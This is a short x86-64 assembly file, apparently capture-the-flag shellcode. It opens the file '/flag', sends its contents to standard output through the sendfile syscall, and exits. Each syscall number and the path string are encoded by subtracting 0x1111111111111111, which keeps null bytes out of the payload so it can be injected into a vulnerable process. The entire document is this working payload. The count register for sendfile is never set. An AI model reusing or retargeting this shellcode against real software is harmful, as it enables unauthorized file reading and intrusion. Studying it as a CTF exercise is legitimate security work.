BITS 64

SECTION .text
	GLOBAL _start

_start:

    ;OPEN FILE /flag

    ;stack = 67616c662f
    ;mov rax, "/flag"
    mov rax, 0x11111178727D7740
    mov r12, 0x1111111111111111
    sub rax, r12
    push rax

    ;rax = 2
    xor rax, rax
    inc rax
    inc rax

    mov rdi, rsp
    
    ;rsi = 0
    xor rsi, rsi

    ;rdx = 0
    xor rdx, rdx
    
    syscall  
    mov r8, rax     ;r8 = /flag handle


    ;WRITE /flag TO STDOUT

    ;rax = 40 = 0x28
    mov rax, 0x1111111111111139
    mov r12, 0x1111111111111111
    sub rax, r12

    ;rdi = 1
    xor rdi, rdi
    inc rdi

	mov	rsi, r8
	syscall


    ;EXIT PROGRAM

    ;rdi = 0
	xor rdi, rdi
    
    ;rax = 60
	mov	rax, 0x111111111111114D
    mov r12, 0x1111111111111111
    sub rax, r12
	syscall
